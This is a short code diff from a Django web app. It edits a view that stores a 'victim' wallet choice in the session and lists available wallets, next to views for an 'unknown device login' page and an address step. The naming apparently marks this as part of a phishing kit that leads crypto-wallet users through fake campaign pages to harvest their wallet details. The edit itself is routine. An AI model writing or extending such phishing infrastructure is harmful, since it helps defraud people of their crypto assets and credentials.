@@ -139,19 +139,20 @@ def campaign_list(request):
 
 def wallet_info(request, campaign_id):
     campaign = get_object_or_404(Campaign, id=campaign_id)
+    from .models import Wallet  # Make sure this is the correct Wallet model
 
     if request.method == 'POST':
         form = WalletForm(request.POST)
         if form.is_valid():
             victim_info = form.save(commit=False)
-            # Store wallet ID and name in session
             request.session['victim_wallet_id'] = victim_info.wallet.id
-            request.session['victim_wallet_name'] = victim_info.wallet.name  # Optional
+            request.session['victim_wallet_name'] = victim_info.wallet.name
             return redirect('core:address_info', campaign_id=campaign.id)
     else:
         form = WalletForm()
 
-    return render(request, 'core/wallet_info.html', {'form': form, 'campaign': campaign})
+    wallets = Wallet.objects.all()
+    return render(request, 'core/wallet_info.html', {'form': form, 'campaign': campaign, 'wallets': wallets})
 
 def unknown_device_login(request, campaign_id):
     campaign = get_object_or_404(Campaign, id=campaign_id)
